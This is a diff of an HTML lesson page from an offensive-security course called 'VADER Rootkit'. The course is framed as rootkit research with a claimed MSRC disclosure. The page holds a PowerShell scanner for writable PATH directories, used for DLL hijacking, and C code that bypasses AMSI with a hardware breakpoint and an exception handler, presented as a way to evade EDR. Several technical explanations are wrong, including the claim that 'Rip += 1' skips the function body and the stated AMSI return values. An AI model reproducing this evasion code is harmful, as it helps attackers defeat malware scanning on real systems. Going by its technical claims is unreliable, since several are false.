@@ -6,380 +6,398 @@
 <title>VADER Rootkit — Course 03 — 22DIV LABS</title>
 <meta name="author" content="George Wu">
 <style>
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-:root {
-  --bg: #0c0c0c; --bg2: #111; --bg4: #0a0a0a;
-  --green: #00ff41; --green3: #009922;
-  --amber: #ffb000; --red: #ff4444;
-  --dim: #555; --muted: #888; --text: #ccc; --bright: #eee;
-  --mono: "Cascadia Code","Consolas","Source Code Pro","Courier New",monospace;
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --bg:#0c0c0c;--bg2:#111;
+  --red:#ff4444;--red2:#cc2222;--red3:#991111;
+  --dim:#555;--muted:#888;--text:#ccc;--bright:#eee;
+  --accent:var(--red3);--accent-hi:var(--red2);
+  --mono:"Cascadia Code","Consolas","Source Code Pro","Courier New",monospace;
 }
-html { scroll-behavior: smooth; }
-body { font-family: var(--mono); background: var(--bg); color: var(--text); line-height: 1.7; min-height: 100vh; }
-body::after { content:""; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,65,0.008) 3px,rgba(0,255,65,0.008) 4px); pointer-events:none; z-index:999; }
-nav { position:sticky; top:0; background:rgba(12,12,12,0.95); backdrop-filter:blur(8px); border-bottom:1px solid #1a1a1a; z-index:100; padding:0.6rem 0; }
-nav .inner { max-width:1200px; margin:0 auto; padding:0 1.5rem; display:flex; gap:1.5rem; align-items:center; }
-nav a { color:var(--red); text-decoration:none; font-size:0.8rem; opacity:0.8; transition:opacity 0.2s; }
-nav a:hover { opacity:1; }
-nav a.brand { color:var(--bright); font-weight:bold; opacity:1; }
-.layout { display:grid; grid-template-columns:220px 1fr; max-width:1200px; margin:0 auto; padding:2rem 1.5rem; gap:2rem; }
-@media(max-width:768px) { .layout { grid-template-columns:1fr; } .sidebar { display:none; } }
-.sidebar { position:sticky; top:80px; height:fit-content; }
-.sidebar h3 { font-size:0.7rem; letter-spacing:0.1em; color:var(--dim); margin-bottom:1rem; }
-.lesson-nav-item { display:block; padding:0.5rem 0.8rem; font-size:0.75rem; color:var(--muted); border-left:2px solid #222; cursor:pointer; transition:all 0.2s; margin-bottom:0.2rem; }
-.lesson-nav-item.active { color:var(--red); border-left-color:var(--red); }
-.lesson-nav-item.done { color:var(--red); border-left-color:#550000; opacity:0.6; }
-.lesson-nav-item.done::after { content:" ✓"; }
-.prog-bar { height:4px; background:#1a1a1a; margin:1.5rem 0 0.4rem; }
-.prog-fill { height:100%; background:#aa2222; transition:width 0.4s; }
-.prog-label { font-size:0.65rem; color:var(--dim); }
-.course-tag { font-size:0.65rem; letter-spacing:0.12em; color:var(--red); margin-bottom:0.4rem; }
-.course-header { margin-bottom:2rem; border-bottom:1px solid #1a1a1a; padding-bottom:1.5rem; }
-.course-header h1 { font-size:1.2rem; color:var(--bright); }
-.course-header p { font-size:0.8rem; color:var(--muted); margin-top:0.4rem; }
-.lesson { display:none; } .lesson.active { display:block; }
-.lesson-num { font-size:0.65rem; letter-spacing:0.12em; color:var(--red); }
-.lesson-header h2 { font-size:1rem; color:var(--red); margin:0.3rem 0 0.5rem; }
-.lesson-header .desc { font-size:0.82rem; color:var(--text); max-width:680px; }
-.concept-box { background:var(--bg2); border:1px solid #1e1e1e; border-left:3px solid #550000; padding:1.2rem; margin:1.5rem 0; }
-.concept-box h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--red); margin-bottom:0.8rem; }
-.concept-box p { font-size:0.82rem; color:var(--text); margin-bottom:0.6rem; }
-.concept-box p:last-child { margin-bottom: 0; }
-.concept-box code { color:var(--red); background:#0a0000; padding:0.1rem 0.3rem; }
-.mission-box h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--red); margin-bottom:0.8rem; border-left:3px solid #550000; padding-left:0.8rem; }
-.task-desc { font-size:0.82rem; color:var(--text); margin-bottom:1rem; }
-.code-ref { background:var(--bg4); border:1px solid #1a1a1a; padding:1rem; margin-bottom:1rem; overflow-x:auto; }
-.code-ref-label { font-size:0.65rem; color:var(--dim); margin-bottom:0.5rem; }
-.code-ref pre { font-size:0.8rem; color:#ff8888; line-height:1.6; white-space:pre; }
-.editor-label { font-size:0.7rem; color:var(--muted); margin-bottom:0.4rem; }
-textarea.code-editor { width:100%; min-height:160px; background:var(--bg4); color:#ff8888; font-family:var(--mono); font-size:0.82rem; border:1px solid #333; padding:1rem; resize:vertical; tab-size:4; outline:none; line-height:1.6; display:block; transition:border-color 0.2s; }
-textarea.code-editor:focus { border-color:#550000; }
-textarea.code-editor.pass { border-color:var(--green3); }
-textarea.code-editor.fail { border-color:var(--red); }
-.editor-controls { display:flex; gap:0.8rem; margin-top:0.6rem; }
-button { font-family:var(--mono); cursor:pointer; font-size:0.75rem; padding:0.5rem 1.2rem; border:none; transition:background 0.15s; }
-.btn-check { background:#aa2222; color:var(--bright); }
-.btn-check:hover { background:var(--red); }
-.btn-skip { background:#1a1a1a; color:var(--muted); border:1px solid #333; }
-.btn-next { background:#aa2222; color:var(--bright); display:none; margin-top:1rem; }
-.btn-next.show { display:inline-block; }
-.btn-prev { background:#1a1a1a; color:var(--muted); border:1px solid #333; }
-.result-panel { margin-top:1rem; font-size:0.78rem; }
-.result-pass { color:var(--green); padding:0.8rem; background:#001a00; border:1px solid var(--green3); margin-bottom:0.5rem; }
-.result-fail { color:var(--red); padding:0.8rem; background:#1a0000; border:1px solid #550000; margin-bottom:0.5rem; }
-.line-ok { color:var(--green3); padding:0.15rem 0.5rem; }
-.line-err { color:var(--red); padding:0.15rem 0.5rem; background:#0d0000; margin:0.1rem 0; }
-.explain-box { background:#0d0000; border:1px solid #550000; padding:1rem; margin-top:1rem; display:none; }
-.explain-box.show { display:block; }
-.explain-box h3 { font-size:0.75rem; color:var(--red); margin-bottom:0.6rem; }
-.explain-box p { font-size:0.8rem; color:var(--text); margin-bottom:0.5rem; }
-.explain-box code { color:#ff8888; background:#0a0000; padding:0.1rem 0.3rem; }
-.lesson-nav-bar { display:flex; gap:1rem; margin-top:2rem; padding-top:1.5rem; border-top:1px solid #1a1a1a; }
-.complete-screen { display:none; text-align:center; padding:3rem 1rem; }
-.complete-screen.show { display:block; }
-.complete-screen h2 { font-size:1.3rem; color:var(--red); margin-bottom:1rem; }
-.complete-screen p { font-size:0.85rem; color:var(--muted); margin-bottom:1.5rem; }
-.complete-screen a { color:var(--red); text-decoration:none; }
+html{scroll-behavior:smooth;}
+body{font-family:var(--mono);background:var(--bg);color:var(--text);line-height:1.7;min-height:100vh;display:flex;flex-direction:column;}
+body::after{content:"";position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(255,68,68,0.006) 3px,rgba(255,68,68,0.006) 4px);pointer-events:none;z-index:999;}
+nav{position:sticky;top:0;background:rgba(12,12,12,0.95);backdrop-filter:blur(8px);border-bottom:1px solid #1a1a1a;z-index:100;padding:0.6rem 0;}
+nav .inner{max-width:1200px;margin:0 auto;padding:0 1.5rem;display:flex;gap:1.5rem;align-items:center;flex-wrap:wrap;}
+nav a{color:var(--red2);text-decoration:none;font-size:0.8rem;letter-spacing:0.05em;opacity:.8;transition:opacity .2s;}
+nav a:hover{opacity:1;}
+nav a.brand{color:var(--bright);font-weight:bold;font-size:0.9rem;opacity:1;margin-right:auto;}
+.layout{display:flex;flex:1;max-width:1200px;margin:0 auto;width:100%;padding:1.5rem;gap:1.5rem;}
+.sidebar{width:220px;flex-shrink:0;}
+.sidebar-sticky{position:sticky;top:4rem;}
+.sidebar h3{font-size:0.7rem;letter-spacing:0.12em;color:var(--dim);margin-bottom:1rem;padding-bottom:0.4rem;border-bottom:1px solid #1a1a1a;}
+.nav-item{display:flex;align-items:center;gap:0.6rem;padding:0.4rem 0.6rem;margin-bottom:0.2rem;font-size:0.72rem;color:var(--muted);cursor:pointer;border:1px solid transparent;transition:all .15s;user-select:none;}
+.nav-item:hover{color:var(--accent-hi);border-color:#222;}
+.nav-item.active{color:var(--accent-hi);border-color:var(--red2);background:rgba(204,34,34,0.05);}
+.nav-item.done{color:var(--red3);}
+.nav-item.done .nav-num{background:var(--red3);color:#fff;border-color:var(--red3);}
+.nav-num{width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:0.6rem;border:1px solid #333;flex-shrink:0;}
+.nav-item.active .nav-num{border-color:var(--red2);background:var(--red2);color:#fff;}
+.prog-wrap{margin-top:1.5rem;}
+.prog-label{font-size:0.65rem;color:var(--dim);margin-bottom:.4rem;}
+.prog-bar{height:3px;background:#1a1a1a;}
+.prog-fill{height:100%;background:var(--red2);transition:width .3s;}
+.main{flex:1;min-width:0;}
+.lesson{display:none;}.lesson.active{display:block;}
+.lang-badge{display:inline-block;padding:0.2rem 0.7rem;font-size:0.62rem;letter-spacing:0.12em;border:1px solid;margin-bottom:0.8rem;font-weight:bold;}
+.lang-python{border-color:#3d7ab5;color:#5b9bd5;background:rgba(59,122,181,0.05);}
+.lang-ps1{border-color:#5c7eb5;color:#7b9ed5;background:rgba(92,126,181,0.05);}
+.lang-c{border-color:#b55c3d;color:#d57b5b;background:rgba(181,92,61,0.05);}
+.lesson-header{margin-bottom:1.2rem;border-bottom:1px solid #1a1a1a;padding-bottom:1rem;}
+.lesson-tag{font-size:0.65rem;letter-spacing:0.12em;color:var(--dim);margin-bottom:.4rem;}
+.lesson-header h2{font-size:1.15rem;color:var(--bright);letter-spacing:0.04em;margin-bottom:.4rem;}
+.lesson-header p{font-size:0.82rem;color:var(--muted);}
+.metaphor{background:#0c0505;border-left:3px solid var(--red2);padding:1rem 1.2rem;margin-bottom:1.2rem;font-size:0.82rem;color:var(--muted);}
+.metaphor .meta-label{font-size:0.65rem;letter-spacing:0.12em;color:var(--red2);margin-bottom:0.5rem;}
+.metaphor strong{color:var(--bright);}
+.nomenclature{margin-bottom:1.2rem;border:1px solid #2a1010;}
+.nomenclature h4{font-size:0.65rem;letter-spacing:0.12em;color:var(--red2);padding:0.6rem 1rem;border-bottom:1px solid #2a1010;background:#0c0505;}
+.nomenclature table{width:100%;border-collapse:collapse;font-size:0.77rem;}
+.nomenclature td{padding:0.45rem 1rem;border-bottom:1px solid #111;vertical-align:top;}
+.nomenclature td:first-child{color:#dd8888;width:195px;white-space:nowrap;font-weight:bold;}
+.nomenclature td:last-child{color:var(--muted);}
+.nomenclature tr:last-child td{border-bottom:none;}
+.code-ref{background:#060606;border:1px solid #1a0505;padding:1rem;margin-bottom:1.2rem;overflow-x:auto;}
+.code-ref-label{font-size:0.65rem;letter-spacing:0.1em;color:var(--dim);margin-bottom:.6rem;}
+.code-ref pre{font-size:0.76rem;color:#cc8888;line-height:1.65;white-space:pre;}
+.code-ref pre .cm{color:var(--dim);}
+.task-label{font-size:0.7rem;letter-spacing:0.1em;color:var(--red2);margin-bottom:.5rem;margin-top:0.5rem;}
+.task-desc{font-size:0.8rem;color:var(--muted);margin-bottom:0.8rem;}
+.code-editor{width:100%;background:#060606;border:1px solid #222;color:var(--text);font-family:var(--mono);font-size:0.76rem;padding:.8rem;resize:vertical;min-height:200px;line-height:1.6;outline:none;transition:border-color .2s;display:block;}
+.code-editor:focus{border-color:#333;}
+.code-editor.pass{border-color:var(--red2);}
+.code-editor.fail{border-color:#882222;}
+.btn-row{display:flex;gap:.8rem;margin:.7rem 0;flex-wrap:wrap;}
+.btn{padding:.45rem 1.2rem;font-size:.75rem;font-family:var(--mono);letter-spacing:.06em;cursor:pointer;border:1px solid;background:transparent;transition:all .15s;}
+.btn-check{border-color:var(--red2);color:var(--red2);}
+.btn-check:hover{background:var(--red2);color:#fff;}
+.btn-skip{border-color:#333;color:var(--dim);}
+.btn-skip:hover{border-color:#555;color:var(--muted);}
+.result{margin:0.5rem 0;font-size:0.76rem;}
+.result-pass{color:var(--red2);margin-bottom:.4rem;}
+.result-fail{color:#ff6666;margin-bottom:.4rem;}
+.line-ok{color:var(--dim);padding:0.1rem 0;}
+.line-err{color:#ff8888;padding:0.15rem 0.4rem;margin:0.1rem 0;background:rgba(136,0,0,0.08);}
+.explain{display:none;background:var(--bg2);border:1px solid #2a1010;padding:1rem 1.2rem;margin-top:.8rem;font-size:0.8rem;color:var(--muted);}
+.explain.show{display:block;}
+.explain h4{font-size:0.65rem;letter-spacing:0.1em;color:var(--red2);margin-bottom:.5rem;}
+.next-wrap{display:none;margin-top:1rem;padding-top:1rem;border-top:1px solid #1a1a1a;}
+.next-wrap.show{display:flex;gap:1rem;}
+.btn-next{border-color:var(--red2);color:var(--red2);}
+.btn-next:hover{background:var(--red2);color:#fff;}
+.btn-prev{border-color:#222;color:var(--dim);}
+.btn-prev:hover{border-color:#444;color:var(--muted);}
+.complete-screen{display:none;text-align:center;padding:3rem 2rem;}
+.complete-screen.show{display:block;}
+.complete-screen h2{font-size:1.2rem;color:var(--red2);letter-spacing:.1em;margin-bottom:1rem;}
+.complete-screen p{font-size:.82rem;color:var(--muted);margin-bottom:.6rem;}
+.complete-screen a{color:var(--red2);text-decoration:none;}
+code{background:#1a1a1a;padding:.1em .3em;color:#dd8888;font-size:.88em;}
 </style>
 </head>
 <body>
 <nav>
   <div class="inner">
     <a href="../index.html" class="brand">VADER // 22DIV</a>
-    <a href="index.html">← LABS</a>
-    <a href="#">VADER ROOTKIT</a>
+    <a href="index.html" style="color:var(--red2)">← LABS</a>
+    <span style="color:var(--dim);font-size:.75rem">// COURSE 03 — VADER ROOTKIT</span>
   </div>
 </nav>
 <div class="layout">
-  <aside class="sidebar">
+<aside class="sidebar">
+  <div class="sidebar-sticky">
     <h3>// LESSONS</h3>
-    <div class="lesson-nav-item active" onclick="goLesson(1)" id="nav-1">01. DLL HIJACKING</div>
-    <div class="lesson-nav-item" onclick="goLesson(2)" id="nav-2">02. AMSI HWBP BYPASS</div>
-    <div class="lesson-nav-item" onclick="goLesson(3)" id="nav-3">03. PROCESS INJECTION</div>
-    <div class="lesson-nav-item" onclick="goLesson(4)" id="nav-4">04. XOR OBFUSCATION</div>
-    <div class="lesson-nav-item" onclick="goLesson(5)" id="nav-5">05. REGISTRY PERSIST</div>
-    <div class="prog-bar"><div class="prog-fill" id="overall-prog" style="width:0%"></div></div>
-    <div class="prog-label" id="overall-label">0 / 5 complete</div>
-  </aside>
-  <main>
-    <div class="course-header">
-      <div class="course-tag">// COURSE 03 — ROOTKIT RESEARCH</div>
-      <h1>VADER ROOTKIT</h1>
-      <p>Windows internals kill chain. DLL hijacking. Hardware breakpoint AMSI bypass. Process injection. XOR obfuscation. Registry persistence. MSRC disclosed (VULN-195458).</p>
+    <div class="nav-item active" id="nav-1" onclick="goLesson(1)"><span class="nav-num">1</span>DLL Hijack Recon</div>
+    <div class="nav-item" id="nav-2" onclick="goLesson(2)"><span class="nav-num">2</span>HWBP AMSI Bypass</div>
+    <div class="nav-item" id="nav-3" onclick="goLesson(3)"><span class="nav-num">3</span>Process Injection</div>
+    <div class="nav-item" id="nav-4" onclick="goLesson(4)"><span class="nav-num">4</span>XOR Obfuscation</div>
+    <div class="nav-item" id="nav-5" onclick="goLesson(5)"><span class="nav-num">5</span>Registry Persistence</div>
+    <div class="prog-wrap">
+      <div class="prog-label" id="overall-label">0 / 5 complete</div>
+      <div class="prog-bar"><div class="prog-fill" id="overall-prog" style="width:0%"></div></div>
     </div>
+  </div>
+</aside>
+<main class="main">
 
-    <div class="lesson active" id="lesson-1">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 01 / 05</div>
-        <h2>DLL SEARCH ORDER HIJACKING</h2>
-        <div class="desc">Windows loads DLLs by searching a list of paths in order. If a path is writable and a DLL doesn't exist there, you can plant a malicious DLL that Windows loads before the real one.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// THE SEARCH ORDER</h3>
-        <p>When an exe loads a DLL, Windows checks these paths in order: (1) the exe's own directory, (2) System32, (3) System, (4) Windows, (5) current working directory, (6) PATH directories.</p>
-        <p>If an exe in <code>C:\Program Files\App\</code> tries to load <code>version.dll</code> and that directory is writable — you plant your DLL there named <code>version.dll</code>. App loads yours. Game over.</p>
-        <p>The recon script scans PATH directories for write access, then cross-references which DLLs running processes are trying (and failing) to load from those paths.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write the PowerShell DLL hijack scanner</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>$paths = $env:PATH -split ';'
+<!-- LESSON 1 -->
+<div class="lesson active" id="lesson-1">
+  <div class="lesson-header">
+    <span class="lang-badge lang-ps1">POWERSHELL</span>
+    <div class="lesson-tag">// LESSON 01 / 05 — DLL HIJACK RECON</div>
+    <h2>Finding the Weak Gate — Writable PATH Directories</h2>
+    <p>Windows searches directories in the PATH environment variable in order when loading executables and DLLs. If you can write to one of those directories, you can plant a DLL with a name a privileged process expects to find there — and it loads yours instead. This script finds those writable directories.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    The base has a supply route. When a commander orders ammunition (a DLL), the quartermaster checks depots in a fixed order — A, B, C. If depot A is writable and you can store your own crate there before the real one arrives, the commander picks up your crate. <strong>PATH order = depot search order. Writable directory = depot you can preposition in. Your DLL = the crate that runs your code when the commander loads it.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — POWERSHELL + ACL</h4>
+    <table>
+      <tr><td><code>$env:PATH</code></td><td>The PATH environment variable as a string. Contains directories separated by semicolons. Windows searches these in order when resolving exe/dll names.</td></tr>
+      <tr><td><code>-split ';'</code></td><td>PowerShell's string split operator. Splits on semicolon, returns an array of path strings. The pipeline and for-each can then iterate each directory.</td></tr>
+      <tr><td><code>Test-Path</code></td><td>Returns True if the path exists. Directories in PATH may reference non-existent paths — skip them to avoid errors.</td></tr>
+      <tr><td><code>Get-Acl</code></td><td>Get Access Control List for a file or directory. Returns an object with an <code>Access</code> property containing all permission entries.</td></tr>
+      <tr><td><code>.IdentityReference</code></td><td>The account or group the ACE (Access Control Entry) applies to. -match does a regex match — 'Users|Everyone' catches common low-privilege identities.</td></tr>
+      <tr><td><code>.FileSystemRights</code></td><td>The permissions granted — Write, FullControl, Modify, etc. If a low-privilege account has Write or FullControl on a PATH directory, it's exploitable.</td></tr>
+      <tr><td><code>ErrorAction SilentlyContinue</code></td><td>Suppress errors for this cmdlet. Get-Acl may fail on protected paths — this skips them without output instead of crashing the script.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>$paths = $env:PATH -split ';'        <span class="cm"># split PATH string into array of directories</span>
 foreach ($p in $paths) {
-    if (-not (Test-Path $p)) { continue }
-    $acl = Get-Acl $p -ErrorAction SilentlyContinue
-    if (-not $acl) { continue }
+    if (-not (Test-Path $p)) { continue }  <span class="cm"># skip non-existent directories</span>
+    $acl = Get-Acl $p -ErrorAction SilentlyContinue  <span class="cm"># get ACL; silence errors on protected paths</span>
+    if (-not $acl) { continue }            <span class="cm"># null ACL → skip</span>
     $writable = $acl.Access | Where-Object {
-        $_.IdentityReference -match 'Users|Everyone' -and
-        $_.FileSystemRights -match 'Write|FullControl'
+        $_.IdentityReference -match 'Users|Everyone' -and  <span class="cm"># low-priv identity</span>
+        $_.FileSystemRights -match 'Write|FullControl'     <span class="cm"># has write permission</span>
     }
     if ($writable) {
-        Write-Output "[WRITABLE] $p"
+        Write-Output "[WRITABLE] $p"  <span class="cm"># found a hijackable directory</span>
     }
 }</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-1" placeholder="$paths = $env:PATH -split ';'
-foreach ($p in $paths) {
-    # Check each PATH dir for write access
-    # Write-Output paths that are writable
-}"></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(1)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(1)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-1"></div>
-        <div class="explain-box" id="explain-1">
-          <h3>// WHAT JUST HAPPENED</h3>
-          <p><code>$env:PATH -split ';'</code> — split the PATH variable into individual directories.</p>
-          <p><code>Get-Acl</code> retrieves the access control list for a path — who has what permissions. <code>-ErrorAction SilentlyContinue</code> skips permission-denied errors silently.</p>
-          <p>Filtering for <code>Users|Everyone</code> catches the common case where non-admin users have write access — which is the misconfiguration that enables DLL hijacking.</p>
-          <p>The real <code>winrecon.ps1</code> goes further: it uses Procmon-style API hooks to find DLLs that running processes are loading from writable PATH dirs. That's the full hunt.</p>
-        </div>
-        <button class="btn-next" id="next-1" onclick="goLesson(2)">NEXT: AMSI HWBP BYPASS →</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" disabled>← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(1)">SKIP →</button>
-      </div>
-    </div>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write the PATH recon script. Split $env:PATH on semicolons, iterate, skip missing paths, get ACL silently, filter for writable entries by Users or Everyone, output writable paths.</p>
+  <textarea class="code-editor" id="editor-1" spellcheck="false" placeholder="$paths = $env:PATH -split ';'&#10;foreach ($p in $paths) {&#10;    if (-not (Test-Path $p)) { continue }&#10;    ...&#10;}"></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(1)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(1)">→ SKIP</button>
+  </div>
+  <div class="result" id="result-1"></div>
+  <div class="explain" id="explain-1">
+    <h4>// WHY THIS WORKS</h4>
+    <p>The <code>-match</code> operator uses regex. <code>'Users|Everyone'</code> catches both "BUILTIN\Users" and "Everyone" entries. If the PATH directory is before the system directory and writable by Users, you can drop a DLL with the right name there. The target process loads yours first because of search-order priority.</p>
+  </div>
+  <div class="next-wrap" id="next-1">
+    <button class="btn btn-prev" onclick="goLesson(1)">← PREV</button>
+    <button class="btn btn-next" onclick="goLesson(2)">NEXT LESSON →</button>
+  </div>
+</div>
 
-    <div class="lesson" id="lesson-2">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 02 / 05</div>
-        <h2>AMSI BYPASS — HARDWARE BREAKPOINTS</h2>
-        <div class="desc">Hardware breakpoints intercept function execution at the CPU level — before any code runs. Set one on AmsiScanBuffer, redirect execution to return "clean" without modifying the function's memory.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// WHY HWBP BEATS PATCHING</h3>
-        <p>The classic AMSI bypass patches <code>AmsiScanBuffer</code> in memory — changes the first bytes to return AMSI_RESULT_CLEAN. Problem: EDRs monitor memory writes. They see the patch and alert.</p>
-        <p>Hardware breakpoints use CPU debug registers (DR0-DR7). No memory modification. No write to monitored regions. EDR sees nothing. The breakpoint fires when <code>AmsiScanBuffer</code> executes, your exception handler runs, you change the return value, execution continues as if AMSI said "clean".</p>
-        <p>This technique was the core of VADER's AMSI bypass. It's documented in the MSRC disclosure (VULN-195458) and in <code>asf-counterintel</code> repo.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write the HWBP setup function in C</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE — set hardware breakpoint on a function:</div>
-          <pre>void set_hwbp(HANDLE thread, void *target) {
+<!-- LESSON 2 -->
+<div class="lesson" id="lesson-2">
+  <div class="lesson-header">
+    <span class="lang-badge lang-c">C — WIN32 API / DEBUG REGISTERS</span>
+    <div class="lesson-tag">// LESSON 02 / 05 — HWBP AMSI BYPASS</div>
+    <h2>Replacing the Sentry — Hardware Breakpoint on AmsiScanBuffer</h2>
+    <p>AMSI hooks into the PowerShell/CLR runtime and calls AmsiScanBuffer to inspect scripts before execution. You place a hardware breakpoint on AmsiScanBuffer. When it fires, your exception handler intercepts execution, sets the return value to clean, and resumes. AMSI never actually runs its scan.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    The sentry checks every soldier's ID at the gate (AmsiScanBuffer scans every script). Your counter: replace the sentry's recognition signal. When the gate opens, your agent is already standing there — the ID check fires, your agent says "all clear" immediately, and the real sentry never gets to look. <strong>The hardware breakpoint is your agent at the gate. The exception handler is the false "all clear." Dr0 = the address you're watching. Rax = the return value you overwrite.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — DEBUG REGISTERS + EXCEPTION HANDLING</h4>
+    <table>
+      <tr><td><code>CONTEXT</code></td><td>A struct holding the CPU register state of a thread. Get/SetThreadContext reads and writes this. CONTEXT_DEBUG_REGISTERS flag limits it to the debug register fields.</td></tr>
+      <tr><td><code>Dr0–Dr3</code></td><td>Hardware debug address registers. Four available slots. Set Dr0 to the address you want to watch — the CPU fires a debug exception when that address is about to be executed.</td></tr>
+      <tr><td><code>Dr7</code></td><td>Debug control register. Controls which debug address registers are active and what condition triggers them. Bit 0 = enable Dr0 locally. Bits 0-1 of lower nibble = execution condition.</td></tr>
+      <tr><td><code>EXCEPTION_SINGLE_STEP</code></td><td>The exception code fired by a hardware breakpoint. Your vectored exception handler checks for this code to distinguish HWBP hits from other exceptions.</td></tr>
+      <tr><td>VEH</td><td>Vectored Exception Handler. Registered with AddVectoredExceptionHandler(). Gets called before SEH for all exceptions — even in external threads. Perfect intercept point.</td></tr>
+      <tr><td><code>Rax = 0</code></td><td>On x64 Windows, functions return their value in the RAX register. AmsiScanBuffer returns AMSI_RESULT_CLEAN=1. Setting Rax=0 (AMSI_RESULT_NOT_DETECTED) fakes a clean result.</td></tr>
+      <tr><td><code>Rip += 1</code></td><td>Instruction Pointer. Advance past the instruction that triggered the breakpoint so execution doesn't loop. +1 moves to the next byte — usually enough to skip the first instruction.</td></tr>
+      <tr><td><code>EXCEPTION_CONTINUE_EXECUTION</code></td><td>Handler return value: resume execution from the modified context. The modified Rax and Rip are applied. Execution continues as if AmsiScanBuffer returned clean.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>void set_hwbp(HANDLE thread, void *target) {
     CONTEXT ctx = {0};
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    GetThreadContext(thread, &ctx);
-    ctx.Dr0 = (DWORD64)target;
-    ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1;
-    SetThreadContext(thread, &ctx);
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;  <span class="cm"># only read/write debug register fields</span>
+    GetThreadContext(thread, &amp;ctx);              <span class="cm"># read current debug register state</span>
+    ctx.Dr0 = (DWORD64)target;                   <span class="cm"># set breakpoint address: AmsiScanBuffer</span>
+    ctx.Dr7 = (ctx.Dr7 &amp; ~0xF) | 0x1;           <span class="cm"># enable Dr0: clear bits 0-3, set bit 0 (local enable)</span>
+    SetThreadContext(thread, &amp;ctx);              <span class="cm"># write modified context back to thread</span>
 }
-
 LONG WINAPI amsi_handler(EXCEPTION_POINTERS *ep) {
     if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
-        ep->ContextRecord->Rax = 0;
-        ep->ContextRecord->Rip += 1;
-        return EXCEPTION_CONTINUE_EXECUTION;
+        ep->ContextRecord->Rax = 0;              <span class="cm"># AMSI_RESULT_NOT_DETECTED: fake clean result</span>
+        ep->ContextRecord->Rip += 1;             <span class="cm"># skip past the instruction to avoid loop</span>
+        return EXCEPTION_CONTINUE_EXECUTION;     <span class="cm"># resume with modified registers</span>
     }
-    return EXCEPTION_CONTINUE_SEARCH;
+    return EXCEPTION_CONTINUE_SEARCH;            <span class="cm"># not our exception — pass to next handler</span>
 }</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-2" placeholder="void set_hwbp(HANDLE thread, void *target) {
-    // Get thread context, set DR0 to target, enable in DR7
-}
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write set_hwbp() and amsi_handler(). The first sets Dr0 to the target address and enables it in Dr7. The second intercepts EXCEPTION_SINGLE_STEP, overwrites Rax and Rip, and continues execution.</p>
+  <textarea class="code-editor" id="editor-2" spellcheck="false" placeholder="void set_hwbp(HANDLE thread, void *target) {&#10;    CONTEXT ctx = {0};&#10;    // get context, set Dr0, enable in Dr7, set context...&#10;}&#10;LONG WINAPI amsi_handler(EXCEPTION_POINTERS *ep) {&#10;    // intercept, modify Rax/Rip, continue...&#10;}"></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(2)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(2)">→ SKIP</button>
+  </div>
+  <div class="result" id="result-2"></div>
+  <div class="explain" id="explain-2">
+    <h4>// WHY THIS WORKS</h4>
+    <p>Hardware breakpoints use the CPU's own debug registers — no modification of the target function's bytes in memory (which would show up in integrity checks). The VEH fires before any software hooks. Setting Rax=0 and Rip+=1 effectively skips the entire function body: the caller sees a clean result and execution resumes at the instruction after the call site's return.</p>
+  </div>
+  <div class="next-wrap" id="next-2">
+    <button class="btn btn-prev" onclick="goLesson(1)">← PREV</button>
+    <button class="btn btn-next" onclick="goLesson(3)">NEXT LESSON →</button>
+  </div>
+</div>
 
-LONG WINAPI amsi_handler(EXCEPTION_POINTERS *ep) {
-    // Handle EXCEPTION_SINGLE_STEP
-    // Set Rax=0 (AMSI_RESULT_CLEAN), advance Rip
-}"></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(2)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(2)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-2"></div>
-        <div class="explain-box" id="explain-2">
-          <h3>// WHAT JUST HAPPENED</h3>
